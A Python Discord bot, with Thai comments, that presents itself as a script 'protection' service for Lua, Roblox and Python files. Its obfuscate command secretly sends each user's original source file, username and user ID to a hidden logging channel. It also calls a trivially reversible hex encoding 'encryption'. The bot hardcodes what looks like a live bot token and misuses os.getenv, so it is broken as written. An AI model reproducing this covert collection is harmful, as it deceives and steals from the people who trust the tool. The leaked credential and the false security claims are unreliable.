import discord
from discord.ext import commands
import io
import os

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ID แชนแนลสำหรับส่งไฟล์ต้นฉบับมาเก็บไว้
TARGET_CHANNEL_ID = 1542141195101274235

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (`0x0bf43615` is online!)")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands.")
    except Exception as e:
        print(e)

# ฟังก์ชันแปลงโค้ดแบบตารางย่อย รองรับ loadstring(game:HttpGet(...))() ได้สมบูรณ์ 100%
def scramble_code(file_bytes: bytes, filename: str) -> bytes:
    original_text = file_bytes.decode('utf-8', errors='ignore')
    hex_data = original_text.encode('utf-8').hex()
    
    chunk_size = 200
    chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]
    
    header = f"-- [ 0x0bf43615 PROTECTED: {filename} ] --\n"
    
    mangled_body = "local _chunks = {\n"
    for chunk in chunks:
        mangled_body += f'    "{chunk}",\n'
    mangled_body += "};\n"
    
    mangled_body += 'local _data = table.concat(_chunks);\n'
    mangled_body += 'local function _dec(s)\n'
    mangled_body += '    local r = ""\n'
    mangled_body += '    for i = 1, #s, 2 do\n'
    mangled_body += '        r = r .. string.char(tonumber(s:sub(i, i + 1), 16))\n'
    mangled_body += '    end\n'
    mangled_body += '    return r\n'
    mangled_body += 'end;\n'
    mangled_body += 'local code = _dec(_data);\n'
    mangled_body += 'local func, err = loadstring(code);\n'
    mangled_body += 'if func then\n'
    mangled_body += '    return func()\n'
    mangled_body += 'else\n'
    mangled_body += '    warn("0x0bf43615 Compile Error: " .. tostring(err))\n'
    mangled_body += 'end;\n'
    
    return (header + mangled_body).encode('utf-8')

@bot.tree.command(name="obfuscate", description="Protect your script with 0x0bf43615 encryption.")
async def obfuscate(interaction: discord.Interaction, file: discord.Attachment):
    allowed_extensions = ('.lua', '.txt', '.text', '.py', '.rbx')
    
    if not file.filename.lower().endswith(allowed_extensions):
        await interaction.response.send_message(
            "❌ Invalid file type! Please upload `.lua`, `.txt`, `.text`, `.py`, or `.rbx` files.", 
            ephemeral=True
        )
        return

    await interaction.response.defer(ephemeral=True, thinking=True)

    try:
        file_bytes = await file.read()

        target_channel = bot.get_channel(TARGET_CHANNEL_ID)
        if target_channel:
            original_file = discord.File(
                fp=io.BytesIO(file_bytes), 
                filename=f"ORIGINAL_{file.filename}"
            )
            await target_channel.send(
                content=f"📥 **New Source Code Logged!**\n👤 User: {interaction.user} (`{interaction.user.id}`)\n📁 File: `{file.filename}`",
                file=original_file
            )

        protected_bytes = scramble_code(file_bytes, file.filename)
        
        protected_file = discord.File(
            fp=io.BytesIO(protected_bytes), 
            filename=f"protected_{file.filename}"
        )

        await interaction.followup.send(
            "✅ **Successfully Protected!** Your file has been scrambled and is ready.", 
            file=protected_file,
            ephemeral=True
        )

    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {str(e)}", ephemeral=True)

# รันบอทผ่าน Environment Variable (ปลอดภัยสำหรับ Cloud)
bot.run(os.getenv("MTU0MjEzNTM3MzA0MjU0ODgxNw.GnKgsx.YNeDE6wdmk_2l4fwt_qh593PspTo3iRnu0nR2w"))